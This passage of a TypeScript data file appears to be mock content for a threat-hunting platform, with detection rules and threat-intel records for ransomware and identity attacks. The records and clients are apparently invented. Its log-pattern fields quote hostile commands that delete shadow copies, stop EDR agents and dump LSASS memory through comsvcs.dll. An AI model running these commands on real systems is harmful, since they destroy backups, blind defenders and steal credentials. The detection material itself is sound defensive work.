    totalAlertsTriggered: 4,
    falsePositiveRatePct: 0.2,
    tuningNotes: 'Whitelisted certified backup script backup-sql-dump.ps1 running from System32 with strict hash validation.',
    clientApprover: 'Dr. Gregory House (CISO, client)',
    runbookUrl: 'https://wiki.example.org/secops/runbooks/RB-CRED-003',
  },
  {
    id: 'det-rule-002',
    clientId: 'client-apex-health',
    huntReportId: 'rep-4',
    huntHypothesisTitle: 'Shadow Copy Deletion & VSSAdmin Tampering Pre-Ransomware',
    ruleName: 'RULE-RANSOMWARE-INHIBIT-RECOVERY-VSSADMIN',
    description: 'Detects execution of vssadmin, bcdedit, or wbadmin attempting to delete volume shadow copies or disable recovery boot configuration.',
    platform: 'CrowdStrike Falcon (LQL)',
    severity: 'Critical',
    status: 'Production Active',
    techniqueIds: ['T1490'],
    tactics: ['Impact', 'Defense Evasion'],
    queryLogic: `event_platform=win event_simpleName=ProcessRollup2
| where (ImageFileName match "\\\\vssadmin\\.exe$" AND CommandLine match "(delete\\s+shadows|resize\\s+shadowstorage)")
  OR (ImageFileName match "\\\\bcdedit\\.exe$" AND CommandLine match "(recoveryenabled\\s+no|bootstatuspolicy\\s+ignoreallfailures)")
  OR (ImageFileName match "\\\\wbadmin\\.exe$" AND CommandLine match "delete\\s+catalog")
| table _time, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine`,
    targetDataSources: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1'],
    targetEnvironment: 'CrowdStrike Falcon Console (CID: 48F2A09B8)',
    deployedBy: 'Marcus Vance',
    sentDate: '2026-09-21T11:00:00Z',
    approvedDate: '2026-09-21T16:45:00Z',
    lastTriggeredDate: '2026-09-23T04:12:00Z',
    totalAlertsTriggered: 1,
    falsePositiveRatePct: 0.0,
    tuningNotes: 'Zero benign tools should execute shadow copy deletion in clinical environment without automated IT change window tag.',
    clientApprover: 'Rachel Greene (Lead SOC Analyst, client)',
    runbookUrl: 'https://wiki.example.org/secops/runbooks/RB-RANSOM-001',
  },
  {
    id: 'det-rule-003',
    clientId: 'client-apex-health',
    huntReportId: 'rep-citrix-01',
    huntHypothesisTitle: 'CitrixBleed & Session Hijack Token Reuse in EHR Perimeter',
    ruleName: 'RULE-CITRIXBLEED-COOKIE-ANOMALOUS-ASN-REUSE',
    description: 'Monitors netflow and Citrix NetScaler ADC access logs for session cookie tokens replayed from novel autonomous systems (ASNs) within 15 minutes of login.',
    platform: 'Sigma (Generic)',
    severity: 'High',
    status: 'Testing / Staging',
    techniqueIds: ['T1539', 'T1078.004'],
    tactics: ['Credential Access', 'Initial Access'],
    queryLogic: `title: Citrix NetScaler Session Cookie Replay from Disparate Geo/ASN
status: experimental
logsource:
    category: webserver
    product: citrix_adc
detection:
    selection:
        cs-method: 'POST'
        cs-uri-stem|contains: '/vpn/index.html'
        sc-status: 200
    filter_trusted_subnet:
        c-ip|cidr: '10.0.0.0/8'
    condition: selection and not filter_trusted_subnet`,
    targetDataSources: ['WAF Telemetry', 'Firewall / NetFlow Telemetry'],
    targetEnvironment: 'Staging Splunk Cluster (Cluster-Staging-02)',
    deployedBy: 'Elena Rostova',
    sentDate: '2026-09-23T16:20:00Z',
    totalAlertsTriggered: 12,
    falsePositiveRatePct: 15.4,
    tuningNotes: 'Currently undergoing 14-day silent staging. Tuning out physician roaming between hospital campus Wi-Fi and cellular hot-spots.',
    clientApprover: 'Pending - Scheduled for SOC review Sep 28',
  },
  {
    id: 'det-rule-004',
    clientId: 'client-vanguard-fin',
    huntReportId: 'rep-2',
    huntHypothesisTitle: 'BloodHound / SharpHound LDAP Reconnaissance',
    ruleName: 'RULE-AD-HIGH-VOLUME-LDAP-DIRECTORY-ENUMERATION',
    description: 'Detects unusual spikes of LDAP and SAMR object search queries targeting sensitive Active Directory objects and Kerberos SPN listings.',
    platform: 'Splunk Enterprise (SPL)',
    severity: 'High',
    status: 'Production Active',
    techniqueIds: ['T1087.002', 'T1069.002'],
    tactics: ['Discovery'],
    queryLogic: `index=windows EventCode=1644
| stats count as search_count, dc(Filter) as unique_filters, values(TargetObject) as objects by AccountName, ClientIPAddress, _time span=5m
| where search_count > 150 AND unique_filters > 25
| lookup corporate_assets ip as ClientIPAddress OUTPUT asset_tier, hostname
| where asset_tier != "DomainController"`,
    targetDataSources: ['Windows Event 4688 / Sysmon 1', 'Active Directory Event 4720/4738'],
    targetEnvironment: 'Splunk Enterprise Security (Cluster: US-East-Banking-ES)',
    deployedBy: 'Sarah Lin',
    sentDate: '2026-09-15T10:00:00Z',
    approvedDate: '2026-09-16T14:00:00Z',
    lastTriggeredDate: '2026-09-22T19:04:15Z',
    totalAlertsTriggered: 6,
    falsePositiveRatePct: 2.1,
    tuningNotes: 'Configured exclusion for weekly IT Asset Discovery agent vulnerability scan service account.',
    clientApprover: 'David Sterling (Head of Cyber Defense, client)',
  },
  {
    id: 'det-rule-005',
    clientId: 'client-vanguard-fin',
    huntReportId: 'th-3',
    huntHypothesisTitle: 'Unusual Fast-Follow MFA Push Authentication and Fast Device Enrollment',
    ruleName: 'OKTA-PROD-MFA-FATIGUE-FOLLOWED-BY-FIDO2-ENROLL',
    description: 'Flags successful Okta session logins following 3+ rejected push prompts immediately succeeded by a new authenticator factor registration.',
    platform: 'Splunk Enterprise (SPL)',
    severity: 'Critical',
    status: 'Production Active',
    techniqueIds: ['T1621', 'T1078.004'],
    tactics: ['Credential Access', 'Persistence'],
    queryLogic: `index=okta (eventType="user.authentication.auth_via_mfa" AND outcome.result="FAILURE") OR (eventType="user.mfa.factor.activate")
| transaction target.user.id maxspan=15m maxpause=5m
| where eventcount > 3
| table _time, actor.alternateId, client.ipAddress, client.geographicalContext.country, target.displayName`,
    targetDataSources: ['Identity Broker Logs (Okta, Entra)'],
    targetEnvironment: 'Okta + Splunk ES Pipeline',
    deployedBy: 'Marcus Vance',
    sentDate: '2026-09-20T17:00:00Z',
    approvedDate: '2026-09-21T08:30:00Z',
    lastTriggeredDate: '2026-09-25T01:14:00Z',
    totalAlertsTriggered: 2,
    falsePositiveRatePct: 0.0,
    tuningNotes: 'High-fidelity signature. Sends instant PagerDuty webhook to the client Incident Response team.',
    clientApprover: 'Sarah Jenkins (SecOps Director, client)',
  },
  {
    id: 'det-rule-006',
    clientId: 'client-aegis-defense',
    huntReportId: 'th-4',
    huntHypothesisTitle: 'Covert DNS Tunneling for Exfiltration & Command Channel',
    ruleName: 'DEF-PROD-HIGH-ENTROPY-DNS-TUNNEL-ZEEK',
    description: 'Calculates Shannon entropy and character length of outbound DNS queries to isolate DNS tunneling protocols like Cobalt Strike or Iodine.',
    platform: 'Splunk Enterprise (SPL)',
    severity: 'High',
    status: 'Production Active',
    techniqueIds: ['T1071.004', 'T1048'],
    tactics: ['Command and Control', 'Exfiltration'],
    queryLogic: `index=zeek sourcetype="zeek:dns"
| eval query_len = len(query)
| where query_len > 42
| stats count, dc(query) as unique_subdomains, avg(query_len) as avg_len by id.orig_h, domain
| where unique_subdomains > 35 AND avg_len > 38
| table id.orig_h, domain, unique_subdomains, avg_len, count`,
    targetDataSources: ['DNS Query Logs', 'Zeek / Suricata Network NIDS'],
    targetEnvironment: 'Classified Enclave SIEM (Air-Gapped Splunk ES)',
    deployedBy: 'Elena Rostova',
    sentDate: '2026-09-22T09:00:00Z',
    approvedDate: '2026-09-22T13:30:00Z',
    lastTriggeredDate: '2026-09-24T11:45:00Z',
    totalAlertsTriggered: 1,
    falsePositiveRatePct: 0.0,
    tuningNotes: 'Whitelisted authorized CDN domain validation endpoints (e.g. *.akadns.net).',
    clientApprover: 'Cmdr. Thomas Vance (Cyber Ops Lead, client)',
  }
];

export const SECTOR_THREAT_INTEL: SectorThreatIntel[] = [
  {
    id: 'intel-cleo-clop-001',
    title: 'Clop Ransomware Syndicate Weaponizing Cleo File Transfer Zero-Days (CVE-2024-55956 & CVE-2024-50623)',
    sectors: ['healthcare', 'finance', 'retail', 'technology', 'energy', 'defense'],
    targetedCountries: ['United States', 'United Kingdom', 'Germany', 'Canada', 'Australia'],
    threatActors: ['Clop Ransomware (TA505)', 'FIN11'],
    cvesObserved: ['CVE-2024-55956 (Cleo LexiCom RCE)', 'CVE-2024-50623 (Auth Bypass)'],
    summary: 'Ransomware syndicates are conducting automated, opportunistic mass exploitation of Cleo LexiCom, VLTrader, and Harmony file transfer platforms. Attackers execute unauthenticated remote code execution, drop web shells into webapp roots, and spawn encoded PowerShell processes to stage customer archives before executing triple-extortion data theft.',
    urgency: 'Critical',
    entryVectors: ['Zero-Day Cleo Perimeter Exploitation', 'Unauthenticated Web Shell Drop', 'Encoded PowerShell Memory Execution'],
    primaryTTPs: [
      { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' },
      { id: 'T1505.003', name: 'Web Shell', tactic: 'Persistence' },
      { id: 'T1059.001', name: 'PowerShell Execution', tactic: 'Execution' },
      { id: 'T1567.002', name: 'Exfiltration to Cloud Storage', tactic: 'Exfiltration' }
    ],
    suggestedHuntPackage: {
      hypothesisTitle: 'Cleo File Transfer: Detect Process Execution & Memory Injection Spawned from Webapp Directories',
      description: 'Search for Cleo LexiCom, VLTrader, or Harmony Java parent processes spawning interactive command-line or PowerShell processes executing web downloads or archive staging.',
      queryLanguage: 'KQL',
      queryCode: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cleo.exe", "harmony.exe", "vltrader.exe", "tomcat.exe", "javaw.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe")
| where ProcessCommandLine has_any ("DownloadString", "Invoke-Expression", "-enc", "System.Net.WebClient", "whoami", "net user")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`,
      requiredDataSources: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1', 'Web Proxy Logs'],
      logPattern: 'cleo.exe spawned powershell.exe -enc JAB3AGUAYgA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA... executing remote payload download.',
      platformQueries: {
        sigma: `title: Cleo LexiCom / Harmony Process Spawning Web Shell or Script Engine
id: c714d241-71e8-4660-84c8-b2fa09871101
status: production
description: Detects Cleo file transfer software spawning command line interpreters or script hosts indicative of CVE-2024-55956 exploitation.
author: Threat Hunting Team
references:
  - https://www.bleepingcomputer.com/news/security/clop-ransomware-cleo-file-transfer-zero-days/
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\\cleo.exe'
      - '\\harmony.exe'
      - '\\vltrader.exe'
      - '\\tomcat.exe'
      - '\\javaw.exe'
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
      - '\\pwsh.exe'
      - '\\wscript.exe'
    CommandLine|contains:
      - 'DownloadString'
      - 'Invoke-Expression'
      - '-enc'
      - 'WebClient'
      - 'whoami'
  condition: selection
level: critical`,
        fql: `#event_simpleName=ProcessRollup2 (ParentBaseFileName=/cleo\\.exe|harmony\\.exe|vltrader\\.exe|tomcat.*\\.exe|javaw\\.exe/i) (FileName=/powershell\\.exe|cmd\\.exe|pwsh\\.exe|wscript\\.exe/i) CommandLine=/.*(DownloadString|Invoke-Expression|-enc|System\\.Net\\.WebClient|whoami).*/i`,
        kql: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cleo.exe", "harmony.exe", "vltrader.exe", "tomcat.exe", "javaw.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe")
| where ProcessCommandLine has_any ("DownloadString", "Invoke-Expression", "-enc", "System.Net.WebClient", "whoami", "net user")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`,
        sentinelone: `EventType In ("Process Creation") AND SrcProcName RegExp "(?i)(cleo|harmony|vltrader|tomcat|javaw)\\.exe" AND TgtProcName RegExp "(?i)(cmd|powershell|pwsh|wscript)\\.exe" AND TgtProcCmdLine RegExp "(?i)(downloadstring|invoke-expression|-enc|webclient|whoami)"`,
        trendmicro: `endpointType: endpoint AND (parentProcessName: "cleo.exe" OR parentProcessName: "harmony.exe" OR parentProcessName: "vltrader.exe" OR parentProcessName: "javaw.exe") AND (processName: "powershell.exe" OR processName: "cmd.exe" OR processName: "pwsh.exe") AND processCmd: (*DownloadString* OR *Invoke-Expression* OR *-enc* OR *WebClient* OR *whoami*)`,
        splunk: `index=windows EventCode=4688 (ParentProcessName="*\\\\cleo.exe" OR ParentProcessName="*\\\\harmony.exe" OR ParentProcessName="*\\\\vltrader.exe" OR ParentProcessName="*\\\\tomcat*.exe" OR ParentProcessName="*\\\\javaw.exe") (NewProcessName="*\\\\powershell.exe" OR NewProcessName="*\\\\cmd.exe")
| where match(CommandLine, "(?i)(DownloadString|Invoke-Expression|-enc|WebClient|whoami)")
| table _time, ComputerName, ParentProcessName, NewProcessName, CommandLine, SubjectUserName`,
        elastic: `process where event.type == "start" and
  process.parent.name in ("cleo.exe", "harmony.exe", "vltrader.exe", "tomcat.exe", "javaw.exe") and
  process.name in ("cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe") and
  process.command_line : ("*DownloadString*", "*Invoke-Expression*", "*-enc*", "*WebClient*", "*whoami*")`,
      }
    },
    publishedDate: '2026-09-25',
    sourceAttribution: 'BleepingComputer • CISA KEV Advisory',
    sourcePublisher: 'BleepingComputer',
    sourceUrl: 'https://www.bleepingcomputer.com/news/security/clop-ransomware-actively-exploiting-cleo-zero-days/',
  },
  {
    id: 'intel-qilin-forti-002',
    title: 'Qilin Ransomware 80% Surge: Fortinet SSL-VPN Exploitation & Clinical System Encryption',
    sectors: ['healthcare', 'technology', 'retail', 'finance', 'energy'],
    targetedCountries: ['United States', 'United Kingdom', 'France', 'Australia', 'Netherlands'],
    threatActors: ['Qilin Ransomware (Agenda)', 'Affiliate Group Water Goblin'],
    cvesObserved: ['CVE-2024-55591 (FortiOS Auth Bypass)', 'CVE-2024-21762 (SSL-VPN RCE)'],
    summary: 'Qilin ransomware incidents have escalated sharply across hospitals and critical infrastructure, with operators gaining unauthorized initial access through Fortinet FortiOS and SSL-VPN appliances. Once inside, adversaries disable security monitoring tools (sc stop, fltmc unload), terminate database services, and delete Windows Volume Shadow Copies using vssadmin and wmic prior to launching multi-threaded file encryption.',
    urgency: 'Critical',
    entryVectors: ['FortiOS Edge Gateway Exploitation', 'Endpoint EDR Service Termination', 'Automated Volume Shadow Destruction'],
    primaryTTPs: [
      { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' },
      { id: 'T1490', name: 'Inhibit System Recovery', tactic: 'Impact' },
      { id: 'T1486', name: 'Data Encrypted for Impact', tactic: 'Impact' },
      { id: 'T1562.001', name: 'Disable Security Monitoring Tools', tactic: 'Defense Evasion' }
    ],
    suggestedHuntPackage: {
      hypothesisTitle: 'Qilin Ransomware: Inhibit System Recovery via VSSAdmin and EDR Service Unloading',
      description: 'Hunt for processes terminating security agents (sc stop, taskkill, fltmc unload) or deleting volume shadow copies (vssadmin, bcdedit, wmic shadowcopy).',
      queryLanguage: 'KQL',
      queryCode: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "rundll32.exe")
| where (ProcessCommandLine has_any ("vssadmin", "delete shadows", "wbadmin", "bcdedit") and ProcessCommandLine has_any ("ignoreallfailures", "recoveryenabled no", "delete catalog"))
     or (ProcessCommandLine has_any ("fltmc unload", "sc stop", "net stop") and ProcessCommandLine has_any ("csagent", "sentinelone", "windefend", "sophos", "carbonblack"))
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      requiredDataSources: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1', 'Firewall / NetFlow Telemetry'],
      logPattern: 'cmd.exe /c "vssadmin.exe delete shadows /all /quiet & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & sc.exe stop csagent"',
      platformQueries: {
        sigma: `title: Qilin Ransomware Volume Shadow Destruction and EDR Disablement
id: b918e112-92f7-4188-91c2-c1ba78991202
status: production
description: Detects commands used by Qilin ransomware to destroy recovery backups and terminate EDR agents.
author: Threat Hunting Team
references:
  - https://thehackernews.com/2025/02/qilin-ransomware-surge-fortinet.html
logsource:
  category: process_creation
  product: windows
detection:
  selection_shadow:
    CommandLine|contains|all:
      - 'vssadmin'
      - 'delete'
      - 'shadows'
  selection_bcdedit:
    CommandLine|contains|all:
      - 'bcdedit'
      - 'bootstatuspolicy'
      - 'ignoreallfailures'
  selection_edr_stop:
    CommandLine|contains:
      - 'fltmc unload'
      - 'sc stop csagent'
      - 'sc stop SentinelOne'
      - 'sc stop WinDefend'
  condition: selection_shadow or selection_bcdedit or selection_edr_stop
level: critical`,
        fql: `#event_simpleName=ProcessRollup2 (CommandLine=/.*(vssadmin.*delete.*shadows|bcdedit.*ignoreallfailures|fltmc.*unload|sc.*stop.*(csagent|sentinelone|windefend)).*/i)`,
        kql: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "rundll32.exe")
| where (ProcessCommandLine has_any ("vssadmin", "delete shadows", "wbadmin", "bcdedit") and ProcessCommandLine has_any ("ignoreallfailures", "recoveryenabled no", "delete catalog"))
     or (ProcessCommandLine has_any ("fltmc unload", "sc stop", "net stop") and ProcessCommandLine has_any ("csagent", "sentinelone", "windefend", "sophos", "carbonblack"))
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
        sentinelone: `EventType In ("Process Creation") AND TgtProcCmdLine RegExp "(?i)(vssadmin.*delete.*shadows|bcdedit.*ignoreallfailures|fltmc.*unload|sc.*stop.*(csagent|sentinelone|windefend))"`,
        trendmicro: `endpointType: endpoint AND (processCmd: (*vssadmin* AND *delete* AND *shadows*) OR processCmd: (*bcdedit* AND *ignoreallfailures*) OR processCmd: (*fltmc* AND *unload*) OR processCmd: (*sc* AND *stop* AND *csagent*))`,
        splunk: `index=windows EventCode=4688
| where match(CommandLine, "(?i)(vssadmin.*delete.*shadows|bcdedit.*ignoreallfailures|fltmc.*unload|sc.*stop.*(csagent|sentinelone|windefend))")
| table _time, ComputerName, SubjectUserName, CommandLine`,
        elastic: `process where event.type == "start" and
  (process.command_line : ("*vssadmin*delete*shadows*", "*bcdedit*ignoreallfailures*", "*fltmc*unload*") or
   process.command_line : ("*sc*stop*csagent*", "*sc*stop*sentinelone*", "*sc*stop*windefend*"))`,
      }
    },
    publishedDate: '2026-09-24',
    sourceAttribution: 'The Hacker News • ReliaQuest CTI',
    sourcePublisher: 'The Hacker News',
    sourceUrl: 'https://thehackernews.com/2025/02/qilin-ransomware-surge-fortinet.html',
  },
  {
    id: 'intel-spider-mfa-003',
    title: 'Scattered Spider (UNC3944): IT Helpdesk Vishing & Rogue MFA/FIDO2 Identity Hijacking',
    sectors: ['retail', 'technology', 'finance', 'healthcare'],
    targetedCountries: ['United States', 'United Kingdom', 'Canada', 'Australia', 'Spain'],
    threatActors: ['Scattered Spider (UNC3944 / Starfraud / Octo Tempest)', 'Muddled Libra'],
    cvesObserved: ['MFA Push Fatigue', 'SIM-Swapping', 'OAuth Misconfiguration'],
    summary: 'Threat actors impersonate corporate employees on telephone calls with internal IT helpdesks to request password resets and bypass MFA controls. After convincing technicians to register new phone numbers or unmanaged FIDO2 security keys, actors log in to Okta and Entra ID admin consoles, assign rogue cloud admin roles, and exfiltrate cloud documents via unauthorized Rclone sync.',
    urgency: 'Critical',
    entryVectors: ['IT Helpdesk Social Engineering / Vishing', 'MFA Push Notification Flooding', 'Rogue FIDO2 Hardware Token Enrollment'],
    primaryTTPs: [
      { id: 'T1621', name: 'Multi-Factor Authentication Request Generation (MFA Fatigue)', tactic: 'Credential Access' },
      { id: 'T1098.001', name: 'Additional Cloud Credentials / Rogue FIDO2', tactic: 'Persistence' },
      { id: 'T1078.004', name: 'Cloud Identity Management Accounts', tactic: 'Initial Access' },
      { id: 'T1567.002', name: 'Exfiltration to Cloud Storage (Rclone / Mega)', tactic: 'Exfiltration' }
    ],
    suggestedHuntPackage: {
      hypothesisTitle: 'Identity Abuse: IT Helpdesk MFA Reset Followed Rapidly by Rogue Factor Enrollment & Admin Access',
      description: 'Audit Okta and Microsoft Entra audit logs for password resets or MFA factor modifications performed by helpdesk personnel followed within 30 minutes by anomalous logins from foreign geolocations or VPN IP ranges.',
      queryLanguage: 'KQL',
      queryCode: `SigninLogs
| where ResultType == 0
| where AuthenticationRequirement == "multiFactorAuthentication"
| summarize AttemptCount = count(), UniqueLocations = dcount(Location), Locations = make_set(Location) by UserPrincipalName, bin(TimeGenerated, 15m)
| where AttemptCount > 8 and UniqueLocations > 1
| project TimeGenerated, UserPrincipalName, AttemptCount, UniqueLocations, Locations`,
      requiredDataSources: ['Identity Broker Logs (Okta, Entra)', 'EDR - SentinelOne', 'Web Proxy Logs'],
      logPattern: 'Helpdesk account initiated user.mfa.factor.activate for finance manager, followed 4 minutes later by session from ProtonVPN IP.',
      platformQueries: {
        sigma: `title: Suspicious Helpdesk Multi-Factor Authentication Reset and Immediate Session Pivot
id: a812f390-33e1-4820-9921-d102e3899303
status: production
description: Detects rapid authentication factor resets followed by immediate foreign login or privileged role assignment.
author: Threat Hunting Team
references:
  - https://www.bleepingcomputer.com/news/security/scattered-spider-targets-it-help-desks-in-sim-swap-push-attacks/
logsource:
  product: okta
  service: audit
detection:
  selection_factor:
    displaymessage:
      - 'User reset factor'
      - 'User enrolled factor'
      - 'Reset password for user'
  condition: selection_factor
level: high`,
        fql: `#event_simpleName=UserLogon (LogonType=RemoteInteractive OR LogonType=Network) AccountName=/.*(admin|helpdesk|svc).*/i IPAddress=/^(?:(?!10\\.|172\\.(?:1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.).)*$/`,
        kql: `SigninLogs
| where ResultType == 0
| where AuthenticationRequirement == "multiFactorAuthentication"
| summarize AttemptCount = count(), UniqueLocations = dcount(Location), Locations = make_set(Location) by UserPrincipalName, bin(TimeGenerated, 15m)
| where AttemptCount > 8 and UniqueLocations > 1
| project TimeGenerated, UserPrincipalName, AttemptCount, UniqueLocations, Locations`,
        sentinelone: `EventType In ("User Login") AND IsRemoteSession In ("True") AND LoginStatus In ("Success") AND SrcIpType In ("External")`,
        trendmicro: `endpointType: network AND (eventSubtype: "cloud_identity_login" OR eventSubtype: "mfa_reset") AND (riskScore >= 70 OR locationCountry: "TOR_EXIT_NODE")`,
        splunk: `index=okta eventType IN ("user.account.reset_password", "user.mfa.factor.activate", "user.session.start")
| transaction actor.alternateId maxspan=30m
| where match(client.geographicalContext.country, "(?i)(unknown|russia|nigeria|romania)") OR client.userAgent LIKE "%HeadlessChrome%"
| table _time, actor.alternateId, eventType, client.ipAddress, client.userAgent, target.displayName`,
        elastic: `authentication where event.action == "user-login" and
  user.target.group in ("Domain Admins", "Global Administrators") and
  not cidrmatch(source.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")`,
      }
    },
    publishedDate: '2026-09-24',
    sourceAttribution: 'BleepingComputer • SecurePoint CTI',
    sourcePublisher: 'BleepingComputer',
    sourceUrl: 'https://www.bleepingcomputer.com/news/security/scattered-spider-targets-it-help-desks-in-sim-swap-push-attacks/',
  },
  {
    id: 'intel-akira-cisco-004',
    title: 'Akira Ransomware: Cisco ASA/AnyConnect SSL VPN Gateway Breach & Shadow Copy Destruction',
    sectors: ['energy', 'defense', 'healthcare', 'technology'],
    targetedCountries: ['United States', 'Germany', 'United Kingdom', 'Japan', 'Sweden'],
    threatActors: ['Akira Ransomware Syndicate', 'Punk Spider'],
    cvesObserved: ['CVE-2024-20353 (Cisco ASA WebVPN RCE)', 'CVE-2024-20359 (Cisco Denial of Service)'],
    summary: 'Akira ransomware affiliates actively target unpatched Cisco ASA and AnyConnect VPN gateways to establish initial remote footholds without multi-factor authentication. Adversaries pivot internally to domain controllers, execute PCHunter and comsvcs.dll to dump credentials, destroy volume shadow copies via LOLBins, and drop customized encryptors.',
    urgency: 'Critical',
    entryVectors: ['Cisco ASA SSL VPN Web Interface Exploit', 'LSASS Memory Dump via Native Comsvcs', 'Volume Shadow Copy Deletion'],
    primaryTTPs: [
      { id: 'T1133', name: 'External Remote Services', tactic: 'Initial Access' },
      { id: 'T1003.001', name: 'LSASS Memory Dump', tactic: 'Credential Access' },
      { id: 'T1490', name: 'Inhibit System Recovery', tactic: 'Impact' },
      { id: 'T1059.003', name: 'Windows Command Shell Scripts', tactic: 'Execution' }
    ],
    suggestedHuntPackage: {
      hypothesisTitle: 'Akira TTP: Hunt for Comsvcs.dll MiniDump LSASS Harvesting & LOLBin Shadow Deletion',
      description: 'Detect rundll32.exe calling comsvcs.dll MiniDump to dump LSASS process memory into temporary directories, accompanied by vssadmin shadow deletions.',
      queryLanguage: 'KQL',
      queryCode: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cmd.exe", "powershell.exe", "rundll32.exe", "wmic.exe")
| where (ProcessCommandLine has "comsvcs.dll" and ProcessCommandLine has "MiniDump")
     or (ProcessCommandLine has "vssadmin" and ProcessCommandLine has "delete shadows")
     or (ProcessCommandLine has "wmic" and ProcessCommandLine has "shadowcopy" and ProcessCommandLine has "delete")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      requiredDataSources: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1', 'VPN / Citrix Access Logs'],
      logPattern: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 724 C:\\Users\\Public\\ls.dmp full',
      platformQueries: {
        sigma: `title: LSASS Memory Dumping via Comsvcs DLL and Volume Shadow Deletion
id: d7291a11-50e9-4671-8872-e19273890404
status: production
description: Detects execution of comsvcs.dll MiniDump and volume shadow deletion used by Akira ransomware.
author: Threat Hunting Team
references:
  - https://thehackernews.com/2024/04/cisco-asa-zero-day-akira-ransomware.html
logsource:
  category: process_creation
  product: windows
detection:
  selection_comsvcs:
    CommandLine|contains|all:
      - 'comsvcs'
      - 'MiniDump'
  selection_vssadmin:
    CommandLine|contains|all:
      - 'vssadmin'
      - 'delete'
      - 'shadows'
  condition: selection_comsvcs or selection_vssadmin
level: critical`,
        fql: `#event_simpleName=ProcessRollup2 (CommandLine=/.*(comsvcs.*MiniDump|vssadmin.*delete.*shadows|wmic.*shadowcopy.*delete).*/i)`,
        kql: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cmd.exe", "powershell.exe", "rundll32.exe", "wmic.exe")
| where (ProcessCommandLine has "comsvcs.dll" and ProcessCommandLine has "MiniDump")
     or (ProcessCommandLine has "vssadmin" and ProcessCommandLine has "delete shadows")
     or (ProcessCommandLine has "wmic" and ProcessCommandLine has "shadowcopy" and ProcessCommandLine has "delete")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
        sentinelone: `EventType In ("Process Creation") AND TgtProcCmdLine RegExp "(?i)(comsvcs.*minidump|vssadmin.*delete.*shadows|wmic.*shadowcopy.*delete)"`,
        trendmicro: `endpointType: endpoint AND (processCmd: (*comsvcs* AND *MiniDump*) OR processCmd: (*vssadmin* AND *delete* AND *shadows*))`,
        splunk: `index=windows EventCode=4688
| where match(CommandLine, "(?i)(comsvcs.*MiniDump|vssadmin.*delete.*shadows|wmic.*shadowcopy.*delete)")
| table _time, ComputerName, SubjectUserName, CommandLine`,
        elastic: `process where event.type == "start" and
  (process.command_line : ("*comsvcs*MiniDump*", "*vssadmin*delete*shadows*", "*wmic*shadowcopy*delete*"))`,
      }
    },
    publishedDate: '2026-09-23',
    sourceAttribution: 'The Hacker News • SecurePoint Advisory',
    sourcePublisher: 'The Hacker News',
    sourceUrl: 'https://thehackernews.com/2024/04/cisco-asa-zero-day-akira-ransomware.html',
  },
];
